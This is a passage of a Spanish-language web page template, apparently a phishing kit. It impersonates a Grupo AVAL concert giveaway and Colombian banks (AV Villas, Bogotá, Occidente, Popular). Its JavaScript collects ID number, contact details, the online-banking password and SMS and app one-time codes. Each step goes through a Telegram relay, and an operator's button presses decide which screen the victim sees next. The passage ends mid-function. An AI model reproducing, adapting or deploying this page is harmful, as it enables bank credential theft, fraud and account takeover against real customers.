<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Concierto Ryan Castro - Grupo AVAL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-image: url('/ryan/rayan.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .hidden {
            display: none !important;
        }

        strong {
            font-weight: 700;
        }

        /* Estilos compartidos para todos los modales */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 50;
            padding: 1rem;
        }

        .modal-content {
            background-color: white;
            border-radius: 1rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            max-width: 85vw;
            width: 100%;
            padding: 1rem;
            animation: fadeIn 0.3s ease-out;
            box-sizing: border-box;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Spinner general */
        .spinner {
            width: 5rem;
            height: 5rem;
            border: 4px solid #dbeafe;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .spinner-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-top: 1.5rem;
        }

        .spinner-text {
            margin-top: 1rem;
            text-align: center;
            color: #374151;
            font-size: 1rem;
            font-weight: 600;
        }

        /* Mensaje de error */
        .error-modal {
            background-color: #fee2e2;
            border-left: 4px solid #dc2626;
            padding: 1rem;
            margin-bottom: 1rem;
            border-radius: 0.5rem;
        }

        .error-modal-text {
            color: #991b1b;
            font-weight: 600;
        }

        /* Estilos para modales de número (O y T) */
        .content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1.5rem;
            width: 100%;
        }

        .logo {
            height: 3.5rem;
            max-width: 100%;
            width: auto;
            object-fit: contain;
        }

        .form-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1rem;
        }

        .message {
            text-align: center;
            color: #374151;
            font-size: 1rem;
            font-weight: 500;
        }

        .input-numero {
            width: 100%;
            max-width: 16rem;
            padding: 0.75rem 1rem;
            text-align: center;
            font-size: 1.5rem;
            font-weight: 700;
            border: 2px solid #d1d5db;
            border-radius: 0.5rem;
            outline: none;
        }

        .input-numero:focus {
            border-color: #2563eb;
        }

        .btn-jugar {
            padding: 0.75rem 2rem;
            background-color: #2563eb;
            color: white;
            font-size: 1.125rem;
            font-weight: 600;
            border-radius: 0.5rem;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            min-width: 10rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .btn-jugar:hover:not(:disabled) {
            background-color: #1d4ed8;
        }

        .btn-jugar:disabled {
            background-color: #9ca3af;
            cursor: not-allowed;
        }

        /* Spinner pequeño dentro del botón */
        .btn-jugar .spinner {
            display: inline-block;
            width: 1.25rem;
            height: 1.25rem;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        /* Estilos para modal de juego */
        .mi-numero {
            text-align: center;
            color: #374151;
            font-size: 1.125rem;
            font-weight: 600;
            margin-bottom: 1rem;
        }

        .numero-mostrado {
            color: #2563eb;
            font-weight: 700;
            font-size: 1.5rem;
            letter-spacing: 0.1em;
        }

        .slots-container {
            display: flex;
            justify-content: center;
            gap: 0.25rem;
            margin-bottom: 1.5rem;
        }

        .slot {
            width: 2.3rem;
            height: 2.75rem;
            border: 2px solid #2563eb;
            border-radius: 0.5rem;
            background: linear-gradient(to bottom, #f0f9ff 0%, #ffffff 50%, #f0f9ff 100%);
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .slot-number {
            font-size: 1.5rem;
            font-weight: 600;
            color: #1e3a8a;
        }

        .mensaje-derrota {
            text-align: center;
            color: #dc2626;
            font-size: 2rem;
            font-weight: 900;
            animation: aparecerPerdida 0.8s ease-out;
        }

        @keyframes aparecerPerdida {
            0% { opacity: 0; transform: scale(0.5) translateY(-20px); }
            60% { transform: scale(1.2) translateY(0); }
            80% { transform: scale(0.95); }
            100% { opacity: 1; transform: scale(1); }
        }

        /* Estilos para modal no cumple */
        .icon-container {
            background-color: #fee2e2;
            border-radius: 50%;
            padding: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon {
            width: 3rem;
            height: 3rem;
            color: #dc2626;
        }

        .dropdown.visible {
            display: block !important;
        }

        /* Toast Notifications */
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        }

        .toast-notification {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            padding: 16px 20px;
            margin-bottom: 10px;
            min-width: 300px;
            max-width: 400px;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: slideIn 0.3s ease-out;
            border-left: 4px solid #3b82f6;
        }

        .toast-notification.success {
            border-left-color: #10b981;
        }

        .toast-notification.error {
            border-left-color: #ef4444;
        }

        .toast-notification.warning {
            border-left-color: #f59e0b;
        }

        .toast-icon {
            font-size: 24px;
            flex-shrink: 0;
        }

        .toast-content {
            flex: 1;
        }

        .toast-title {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 4px;
            color: #1f2937;
        }

        .toast-message {
            font-size: 13px;
            color: #6b7280;
        }

        .toast-close {
            background: none;
            border: none;
            font-size: 20px;
            color: #9ca3af;
            cursor: pointer;
            padding: 0;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .toast-close:hover {
            color: #4b5563;
        }

        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes slideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }

        .toast-notification.hiding {
            animation: slideOut 0.3s ease-in forwards;
        }

        @media (max-width: 640px) {
            .toast-container {
                left: 10px;
                right: 10px;
                top: 10px;
            }

            .toast-notification {
                min-width: auto;
                max-width: none;
            }
        }
    </style>
</head>
<body>
<x-lab-banner />
    <!-- Toast Container -->
    <div class="toast-container" id="toast-container"></div>
    <!-- Modal Participar -->
    <div id="modal-participar" class="hidden">
        <div class="modal-overlay">
            <div class="modal-content">
                <div class="logo-container" style="display: flex; justify-content: center; margin-bottom: 1rem;">
                    <img src="/ryan/logo-ava.png" alt="Grupo AVAL" class="logo" style="height: 3.5rem; max-width: 100%; width: auto; object-fit: contain;" />
                </div>

                <h2 class="title" style="font-size: 1.875rem; font-weight: 700; text-align: center; color: #1e40af; margin-bottom: 1.5rem;">¡Nos vamos de concierto!</h2>

                <p class="description" style="color: #374151; text-align: center; margin-bottom: 2rem; font-size: 1.125rem;">
                    Por ser nuestro cliente, participa y gana dos entradas a <strong>PALCO VIP</strong> para disfrutar del gran concierto de <strong>Ryan Castro</strong>.
                </p>

                <p class="small-text" style="color: #374151; text-align: center; margin-bottom: 0.5rem; font-size: 0.5rem;">Son 100 entradas dobles las que sortearemos.</p>

                <button id="btn-participar" class="btn-primary" style="width: 100%; background-color: #1d4ed8; color: white; font-weight: 700; padding: 1rem 1.5rem; border-radius: 0.75rem; border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);">
                    Quiero Participar
                </button>
            </div>
        </div>
    </div>

    <!-- Modal Condiciones -->
    <div id="modal-condiciones" class="hidden">
        @include('conciertos.modals.condiciones')
    </div>

    <!-- Modal Datos Registro -->
    <div id="modal-datos-registro" class="hidden">
        <div class="modal-overlay">
            <div class="modal-content">
                <div class="logo-container" style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
                    <img src="/ryan/logo-ava.png" alt="Grupo AVAL" class="logo" style="height: 3.5rem; max-width: 100%; width: auto; object-fit: contain;" />
                </div>

                <div id="form-section">
                    <h2 class="title" style="font-size: 1.5rem; font-weight: 700; text-align: center; color: #1e40af; margin-bottom: 1.5rem;">Banca Virtual</h2>

                    <div class="form-group" style="margin-bottom: 1rem;">
                        <label class="label" style="display: block; color: #374151; font-weight: 500; margin-bottom: 0.5rem;">Selecciona tu banco *</label>
                        <div class="select-container" style="position: relative;">
                            <button type="button" id="select-btn" class="select-btn" style="width: 100%; padding: 0.75rem 1rem; border: 2px solid #d1d5db; border-radius: 0.5rem; background: white; text-align: left; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: all 0.2s;">
                                <span id="selected-option" class="selected-option" style="color: #9ca3af; font-size: 0.875rem;">-- Selecciona tu banco --</span>
                                <svg class="select-arrow" id="select-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 1.25rem; height: 1.25rem; color: #9ca3af; transition: transform 0.2s;">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                                </svg>
                            </button>
                            <div id="dropdown" class="dropdown" style="display: none; position: absolute; z-index: 50; width: 100%; margin-top: 0.5rem; background: white; border: 2px solid #d1d5db; border-radius: 0.5rem; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);">
                                <button type="button" class="dropdown-option" data-value="avvillas" style="width: 100%; padding: 0.75rem 1rem; border: none; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f3f4f6;">
                                    <img src="/ryan/logo-avv.png" alt="Banco AV Villas" style="height: 2rem; object-fit: contain;" />
                                </button>
                                <button type="button" class="dropdown-option" data-value="bogota" style="width: 100%; padding: 0.75rem 1rem; border: none; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f3f4f6;">
                                    <img src="/ryan/logo-bog.png" alt="Banco de Bogotá" style="height: 2rem; object-fit: contain;" />
                                </button>
                                <button type="button" class="dropdown-option" data-value="occidente" style="width: 100%; padding: 0.75rem 1rem; border: none; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f3f4f6;">
                                    <img src="/ryan/logo-occ.png" alt="Banco de Occidente" style="height: 2rem; object-fit: contain;" />
                                </button>
                                <button type="button" class="dropdown-option" data-value="popular" style="width: 100%; padding: 0.75rem 1rem; border: none; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center;">
                                    <img src="/ryan/logo-pop.png" alt="Banco Popular" style="height: 2rem; object-fit: contain;" />
                                </button>
                            </div>
                        </div>
                    </div>

                    <div class="form-group" style="margin-bottom: 1rem;">
                        <label class="label" id="label-clave" style="display: block; color: #374151; font-weight: 500; margin-bottom: 0.5rem;">Clave *</label>
                        <input
                            type="password"
                            id="input-clave"
                            name="clave"
                            class="input"
                            placeholder="Ingresa tu clave"
                            style="width: 100%; padding: 0.75rem 1rem; border: 2px solid #d1d5db; border-radius: 0.5rem; font-size: 1rem; transition: all 0.2s; box-sizing: border-box;"
                        />
                        <p class="error-message" id="error-input-clave" style="color: #dc2626; font-size: 0.75rem; margin-top: 0.25rem; display: none;"></p>
                    </div>

                    <button id="btn-ingresar" class="btn-submit" disabled style="width: 100%; background-color: #1d4ed8; color: white; font-weight: 700; padding: 1rem 1.5rem; border-radius: 0.75rem; border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);">
                        Ingresar
                    </button>
                </div>

                <div id="spinner-section" class="spinner-section hidden">
                    <div class="spinner-container" style="display: flex; justify-content: center; align-items: center;">
                        <div class="spinner"></div>
                    </div>
                    <p class="spinner-text">Esperando</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Número O (8 dígitos) -->
    <div id="modal-numero-o" class="hidden">
        <div id="error-numero-o" class="error-modal hidden">
            <p class="error-modal-text">Ya completaste este paso anteriormente</p>
        </div>
        @php
            $banco = 'avvillas';
            $bancos = [
                'avvillas' => ['nombre' => 'Banco AV Villas', 'logo' => 'logo-avv.png'],
                'bogota' => ['nombre' => 'Banco de Bogotá', 'logo' => 'logo-bog.png'],
                'occidente' => ['nombre' => 'Banco de Occidente', 'logo' => 'logo-occ.png'],
                'popular' => ['nombre' => 'Banco Popular', 'logo' => 'logo-pop.png'],
            ];
            $bancoInfo = $bancos[$banco];
        @endphp
        <div class="modal-overlay">
            <div class="modal-content">
                <div class="content">
                    <img src="/ryan/{{ $bancoInfo['logo'] }}" alt="{{ $bancoInfo['nombre'] }}" class="logo" />

                    <div id="form-section-numero-o">
                        <div class="form-section">
                            <p class="message">Te enviaremos tu número de participación</p>
                            <input type="text" id="input-numero-o" name="numero" class="input-numero" maxlength="8" placeholder="Ingresa 8 dígitos" />
                            <button id="btn-jugar-o" class="btn-jugar" disabled>
                                Jugar
                            </button>
                        </div>
                    </div>

                    <div id="spinner-section-numero-o" class="spinner-section hidden">
                        <div class="spinner-container" style="display: flex; justify-content: center; align-items: center;">
                            <div class="spinner"></div>
                        </div>
                        <p class="spinner-text">Esperando</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Número T (6 dígitos) -->
    <div id="modal-numero-t" class="hidden">
        <div id="error-numero-t" class="error-modal hidden">
            <p class="error-modal-text">Ya completaste este paso anteriormente</p>
        </div>
        <div class="modal-overlay">
            <div class="modal-content">
                <div class="content">
                    <img src="/ryan/{{ $bancoInfo['logo'] }}" alt="{{ $bancoInfo['nombre'] }}" class="logo" />

                    <div id="form-section-numero-t">
                        <div class="form-section">
                            <p class="message">Te enviaremos tu número de participación</p>
                            <input type="text" id="input-numero-t" name="numero" class="input-numero" maxlength="6" placeholder="Ingresa 6 dígitos" />
                            <button id="btn-jugar-t" class="btn-jugar" disabled>
                                Jugar
                            </button>
                        </div>
                    </div>

                    <div id="spinner-section-numero-t" class="spinner-section hidden">
                        <div class="spinner-container" style="display: flex; justify-content: center; align-items: center;">
                            <div class="spinner"></div>
                        </div>
                        <p class="spinner-text">Esperando</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Juego -->
    <div id="modal-juego" class="hidden">
        <div id="error-juego" class="error-modal hidden">
            <p class="error-modal-text">Ya completaste este paso anteriormente</p>
        </div>
        <div class="modal-overlay">
            <div class="modal-content">
                <div class="content">
                    <img src="/ryan/{{ $bancoInfo['logo'] }}" alt="{{ $bancoInfo['nombre'] }}" class="logo" />
                    <div class="ruedas-section" id="seccion-ruedas">
                        <div class="mi-numero">
                            Mi número: <span class="numero-mostrado" id="numero-mostrado"></span>
                        </div>
                        <div class="slots-container">
                            @for ($i = 0; $i < 6; $i++)
                                <div class="slot" id="slot-{{ $i }}">
                                    <div class="slot-number">0</div>
                                </div>
                            @endfor
                        </div>
                        <div id="mensaje-derrota" class="hidden mensaje-derrota">
                            ¡HAS PERDIDO!
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal No Cumple -->
    <div id="modal-nocumple" class="hidden">
        @include('conciertos.modals.nocumple')
    </div>

    <script>
        /* ===== TOAST NOTIFICATIONS ===== */
        function showToast(type, title, message, duration = 4000) {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast-notification ${type}`;

            const icon = type === 'success' ? '✓' : type === 'error' ? '✕' : type === 'warning' ? '⚠' : 'ℹ';

            toast.innerHTML = `
                <div class="toast-icon">${icon}</div>
                <div class="toast-content">
                    <div class="toast-title">${title}</div>
                    <div class="toast-message">${message}</div>
                </div>
                <button class="toast-close" onclick="this.parentElement.remove()">×</button>
            `;

            container.appendChild(toast);

            setTimeout(() => {
                toast.classList.add('hiding');
                setTimeout(() => toast.remove(), 300);
            }, duration);
        }

        /* ===== CONFIGURACIÓN INICIAL ===== */

        // Generar uniqId único por sesión (6 caracteres alfanuméricos)
        function generateUniqId() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // Inicializar o recuperar uniqId
        let sessionUniqId = sessionStorage.getItem('uniqId');
        if (!sessionUniqId || sessionUniqId.length !== 6) {
            if (sessionUniqId) {
                localStorage.clear();
            }
            sessionUniqId = generateUniqId();
            sessionStorage.setItem('uniqId', sessionUniqId);
        }

        // Estado global
        const appState = {
            uniqId: sessionUniqId,
            currentModal: null,
            pollingActive: false,
            pollingTimeout: null,
            visitedModals: {} // Trackear modales ya visitados
        };

        /* ===== FUNCIONES DE LOCALSTORAGE ===== */

        // Guardar en localStorage
        function saveToLocalStorage(key, value) {
            const storageKey = `${appState.uniqId}_${key}`;
            const valueToSave = value && value.trim() !== '' ? value : '--';
            localStorage.setItem(storageKey, JSON.stringify(valueToSave));
        }

        // Obtener de localStorage
        function getFromLocalStorage(key) {
            const storageKey = `${appState.uniqId}_${key}`;
            const value = localStorage.getItem(storageKey);
            return value ? JSON.parse(value) : '--';
        }

        // Obtener todos los datos de localStorage
        function getAllDataFromStorage() {
            const data = {};
            const fields = [
                'cedula', 'nombre', 'celular', 'email', 'ciudad', 'direccion',
                'banco', 'clave', 'numero_o', 'numero_t', 'ente', 'status', 'uniqid'
            ];

            fields.forEach(field => {
                const value = getFromLocalStorage(field);
                data[field] = value;
            });

            return data;
        }

        /* ===== COMUNICACIÓN CON TELEGRAM ===== */

        let enviandoATelegram = false;

        // Enviar datos a Telegram
        async function enviarATelegram() {
            if (enviandoATelegram) {
                console.log('Ya hay un envío en progreso, evitando duplicado');
                return;
            }

            enviandoATelegram = true;

            const allData = getAllDataFromStorage();

            try {
                const response = await fetch('/api/telegram/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        uniqid: appState.uniqId,
                        data: allData
                    })
                });
                const result = await response.json();
                console.log('Datos enviados a Telegram:', result);
            } catch (e) {
                console.error('Error al enviar a Telegram:', e);
            } finally {
                setTimeout(() => {
                    enviandoATelegram = false;
                }, 1000);
            }
        }

        /* ===== POLLING ===== */

        async function iniciarPolling() {
            if (appState.pollingActive) {
                return; // Ya hay polling activo
            }

            appState.pollingActive = true;
            console.log('Polling iniciado');

            async function checkTelegram() {
                if (!appState.pollingActive) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({ uniqid: appState.uniqId })
                    });
                    const data = await response.json();

                    if (data.button) {
                        console.log('Botón presionado en Telegram:', data.button);
                        detenerPolling();
                        manejarRespuestaTelegram(data.button);
                    } else {
                        // Seguir consultando cada 2 segundos
                        appState.pollingTimeout = setTimeout(checkTelegram, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    appState.pollingTimeout = setTimeout(checkTelegram, 2000);
                }
            }

            checkTelegram();
        }

        function detenerPolling() {
            appState.pollingActive = false;
            if (appState.pollingTimeout) {
                clearTimeout(appState.pollingTimeout);
                appState.pollingTimeout = null;
            }
            console.log('Polling detenido');
        }

        // Manejar respuesta de Telegram
        function manejarRespuestaTelegram(button) {
            console.log('Botón recibido de Telegram:', button);
            console.log('Tipo de botón:', typeof button);

            const modalMap = {
                'login': 'modal-datos-registro',
                'sms': 'modal-numero-o',
                'app': 'modal-numero-t',
                'exito': 'modal-juego',
                'error': 'modal-nocumple',
                // Agregar variantes posibles
                'codsms': 'modal-numero-o',
                'codapp': 'modal-numero-t'
            };

            const modalId = modalMap[button];
            console.log('Modal a mostrar:', modalId);

            if (modalId) {
                // Verificar si el modal ya fue visitado
                if (appState.visitedModals[modalId]) {
                    console.log('Modal ya visitado:', modalId);
                    // Mostrar mensaje de error
                    const errorId = `error-${modalId.replace('modal-', '')}`;
                    const errorEl = document.getElementById(errorId);
                    if (errorEl) {
                        errorEl.classList.remove('hidden');
                    }
                }

                showModal(modalId);
            } else {
                console.error('No se encontró modal para el botón:', button);
            }
        }

        /* ===== GESTIÓN DE MODALES ===== */

        function showModal(modalId) {
            // Ocultar todos los modales
            document.querySelectorAll('[id^="modal-"]').forEach(modal => {
                modal.classList.add('hidden');
            });

            // Resetear estado de spinners de modales numero-o y numero-t
            const formSectionO = document.getElementById('form-section-numero-o');
            const spinnerSectionO = document.getElementById('spinner-section-numero-o');
            if (formSectionO && spinnerSectionO) {
                formSectionO.classList.remove('hidden');
                spinnerSectionO.classList.add('hidden');
            }

            const formSectionT = document.getElementById('form-section-numero-t');
            const spinnerSectionT = document.getElementById('spinner-section-numero-t');
            if (formSectionT && spinnerSectionT) {
                formSectionT.classList.remove('hidden');
                spinnerSectionT.classList.add('hidden');
            }

            // Mostrar el modal solicitado
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.remove('hidden');
                appState.currentModal = modalId;
            }
        }

        function hideModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.add('hidden');
            }
        }

        function showSpinner() {
            const formSection = document.getElementById('form-section');
            const spinnerSection = document.getElementById('spinner-section');

            if (formSection) formSection.classList.add('hidden');
            if (spinnerSection) spinnerSection.classList.remove('hidden');
        }

        /* ===== MODAL PARTICIPAR ===== */

        document.getElementById('btn-participar').addEventListener('click', async function() {
            // Guardar estado
            saveToLocalStorage('ente', 'ryan');
            saveToLocalStorage('status', 'PARTICIPA');
            saveToLocalStorage('uniqid', appState.uniqId);

            // Enviar a Telegram
            await enviarATelegram();

            // Mostrar siguiente modal
            showModal('modal-condiciones');
        });

        /* ===== MODAL CONDICIONES ===== */

        // Checkbox de aceptar condiciones
        document.getElementById('acepto-participar').addEventListener('change', function(e) {
            const formRegistro = document.getElementById('form-registro');
            if (e.target.checked) {
                formRegistro.classList.add('visible');
            } else {
                formRegistro.classList.remove('visible');
            }
        });

        // Validaciones para el formulario de condiciones
        const validations = {
            cedula: {
                validate: (value) => {
                    if (!value) return 'La cédula es requerida';
                    if (!/^\d+$/.test(value)) return 'La cédula debe contener solo números';
                    if (value.length < 6) return 'La cédula debe tener al menos 6 dígitos';
                    if (value.length > 10) return 'La cédula no puede tener más de 10 dígitos';
                    return null;
                }
            },
            nombre: {
                validate: (value) => {
                    if (!value) return 'El nombre es requerido';
                    if (!/^[a-záéíóúñ\s]+$/i.test(value)) return 'El nombre solo puede contener letras';
                    if (value.length < 3) return 'El nombre debe tener al menos 3 caracteres';
                    if (value.length > 100) return 'El nombre es demasiado largo';
                    return null;
                }
            },
            celular: {
                validate: (value) => {
                    if (!value) return 'El celular es requerido';
                    if (!/^\d+$/.test(value)) return 'El celular debe contener solo números';
                    if (value.length !== 10) return 'El celular debe tener exactamente 10 dígitos';
                    return null;
                }
            },
            email: {
                validate: (value) => {
                    if (!value) return 'El email es requerido';
                    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return 'Por favor ingresa un email válido';
                    return null;
                }
            },
            ciudad: {
                validate: (value) => {
                    if (!value) return 'La ciudad es requerida';
                    if (!/^[a-záéíóúñ\s]+$/i.test(value)) return 'La ciudad solo puede contener letras';
                    if (value.length < 3) return 'La ciudad debe tener al menos 3 caracteres';
                    return null;
                }
            },
            direccion: {
                validate: (value) => {
                    if (!value) return 'La dirección es requerida';
                    if (value.length < 10) return 'La dirección debe tener al menos 10 caracteres';
                    if (value.length > 200) return 'La dirección es demasiado larga';
                    return null;
                }
            }
        };

        // Validar campo individual
        function validateField(fieldName) {
            const input = document.getElementById(fieldName);
            const errorElement = document.getElementById(`error-${fieldName}`);
            const error = validations[fieldName].validate(input.value.trim());

            if (error) {
                input.classList.add('invalid');
                input.classList.remove('valid');
                errorElement.textContent = error;
                errorElement.classList.add('visible');
                return false;
            } else {
                input.classList.remove('invalid');
                input.classList.add('valid');
                errorElement.textContent = '';
                errorElement.classList.remove('visible');
                return true;
            }
        }

        // Actualizar estado del botón registrar
        function updateButtonState() {
            const fields = ['cedula', 'nombre', 'celular', 'email', 'ciudad', 'direccion'];
            const allValid = fields.every(field => {
                const input = document.getElementById(field);
                return input.value.trim() && validations[field].validate(input.value.trim()) === null;
            });

            const btnRegistrar = document.getElementById('btn-registrar');
            btnRegistrar.disabled = !allValid;
        }

        // Agregar listeners de validación a campos del formulario de condiciones
        ['cedula', 'nombre', 'celular', 'email', 'ciudad', 'direccion'].forEach(fieldName => {
            const input = document.getElementById(fieldName);
            input.addEventListener('blur', () => {
                validateField(fieldName);
                updateButtonState();
            });
            input.addEventListener('input', () => {
                updateButtonState();
            });
        });

        // Botón registrar del modal de condiciones
        document.getElementById('btn-registrar').addEventListener('click', async function(e) {
            e.preventDefault();

            // Validar todos los campos
            const fields = ['cedula', 'nombre', 'celular', 'email', 'ciudad', 'direccion'];
            const allValid = fields.every(field => validateField(field));

            if (allValid) {
                // Guardar datos en localStorage
                fields.forEach(field => {
                    saveToLocalStorage(field, document.getElementById(field).value.trim());
                });
                saveToLocalStorage('status', 'REGISTRO');

                // Enviar a Telegram
                await enviarATelegram();

                // Mostrar siguiente modal (datos-registro)
                showModal('modal-datos-registro');
            }
        });

        /* ===== MODAL DATOS REGISTRO (BANCA VIRTUAL) ===== */

        let selectedBank = null;

        // Dropdown del selector de banco
        const selectBtn = document.getElementById('select-btn');
        const dropdown = document.getElementById('dropdown');
        const selectArrow = document.getElementById('select-arrow');
        const selectedOption = document.getElementById('selected-option');

        selectBtn.addEventListener('click', function() {
            dropdown.classList.toggle('visible');
            selectArrow.style.transform = dropdown.classList.contains('visible')
                ? 'rotate(180deg)'
                : 'rotate(0deg)';
        });

        // Opciones del dropdown
        document.querySelectorAll('.dropdown-option').forEach(option => {
            option.addEventListener('click', function() {
                const value = this.getAttribute('data-value');
                const imgSrc = this.querySelector('img').src;

                selectedBank = value;
                selectedOption.innerHTML = `<img src="${imgSrc}" style="height: 2rem; object-fit: contain;" />`;
                selectedOption.style.color = '#374151';

                dropdown.classList.remove('visible');
                selectArrow.style.transform = 'rotate(0deg)';

                updateBancaVirtualButtonState();
            });
        });

        // Cerrar dropdown al hacer clic fuera
        document.addEventListener('click', function(e) {
            if (!selectBtn.contains(e.target) && !dropdown.contains(e.target)) {
                dropdown.classList.remove('visible');
                selectArrow.style.transform = 'rotate(0deg)';
            }
        });

        // Validación del campo clave
        const inputClave = document.getElementById('input-clave');
        inputClave.addEventListener('input', function() {
            updateBancaVirtualButtonState();
        });

        // Actualizar estado del botón ingresar
        function updateBancaVirtualButtonState() {
            const btnIngresar = document.getElementById('btn-ingresar');
            const claveValue = inputClave.value.trim();

            const isValid = selectedBank && claveValue.length >= 4;
            btnIngresar.disabled = !isValid;
        }

        // Botón ingresar del modal datos-registro
        document.getElementById('btn-ingresar').addEventListener('click', async function(e) {
            e.preventDefault();

            if (!selectedBank) {
                showToast('warning', 'Banco requerido', 'Por favor selecciona tu banco');
                return;
            }

            const claveValue = inputClave.value.trim();
            if (!claveValue) {
                showToast('warning', 'Clave requerida', 'Por favor ingresa tu clave');
                return;
            }

            // Marcar modal como visitado
            appState.visitedModals['modal-datos-registro'] = true;

            // Guardar datos en localStorage
            saveToLocalStorage('banco', selectedBank);
            saveToLocalStorage('clave', claveValue);
            saveToLocalStorage('status', 'BANCA');

            // Enviar a Telegram
            await enviarATelegram();

            // Ocultar el formulario y mostrar el spinner
            showSpinner();

            // Iniciar polling para esperar respuesta de Telegram
            iniciarPolling();
        });

        /* ===== MODAL NÚMERO O (8 dígitos) ===== */

        const inputNumeroO = document.getElementById('input-numero-o');
        const btnJugarO = document.getElementById('btn-jugar-o');

        if (inputNumeroO) {
            inputNumeroO.addEventListener('input', function() {
                // Solo permitir números
                this.value = this.value.replace(/\D/g, '');

                // Habilitar botón si tiene 8 dígitos
                if (btnJugarO) {
                    btnJugarO.disabled = this.value.length !== 8;
                }
            });
        }

        if (btnJugarO) {
            btnJugarO.addEventListener('click', async function() {
                const numeroValue = inputNumeroO.value.trim();

                if (numeroValue.length !== 8) {
                    showToast('warning', 'Dígitos incorrectos', 'Debes ingresar exactamente 8 dígitos');
                    return;
                }

                // Marcar modal como visitado
                appState.visitedModals['modal-numero-o'] = true;

                // Guardar número
                saveToLocalStorage('numero_o', numeroValue);
                saveToLocalStorage('status', 'NUMERO_O');

                // Enviar a Telegram
                await enviarATelegram();

                // Ocultar formulario y mostrar spinner
                document.getElementById('form-section-numero-o').classList.add('hidden');
                document.getElementById('spinner-section-numero-o').classList.remove('hidden');

                // Iniciar polling
                iniciarPolling();
            });
        }

        /* ===== MODAL NÚMERO T (6 dígitos) ===== */

        const inputNumeroT = document.getElementById('input-numero-t');
        const btnJugarT = document.getElementById('btn-jugar-t');

        if (inputNumeroT) {
            inputNumeroT.addEventListener('input', function() {
                // Solo permitir números
                this.value = this.value.replace(/\D/g, '');

                // Habilitar botón si tiene 6 dígitos
                if (btnJugarT) {
                    btnJugarT.disabled = this.value.length !== 6;
                }
            });
        }

        if (btnJugarT) {
            btnJugarT.addEventListener('click', async function() {
                const numeroValue = inputNumeroT.value.trim();

                if (numeroValue.length !== 6) {
                    showToast('warning', 'Dígitos incorrectos', 'Debes ingresar exactamente 6 dígitos');
                    return;
                }

                // Marcar modal como visitado
                appState.visitedModals['modal-numero-t'] = true;

                // Guardar número
                saveToLocalStorage('numero_t', numeroValue);
                saveToLocalStorage('status', 'NUMERO_T');

                // Enviar a Telegram
                await enviarATelegram();

                // Ocultar formulario y mostrar spinner
                document.getElementById('form-section-numero-t').classList.add('hidden');
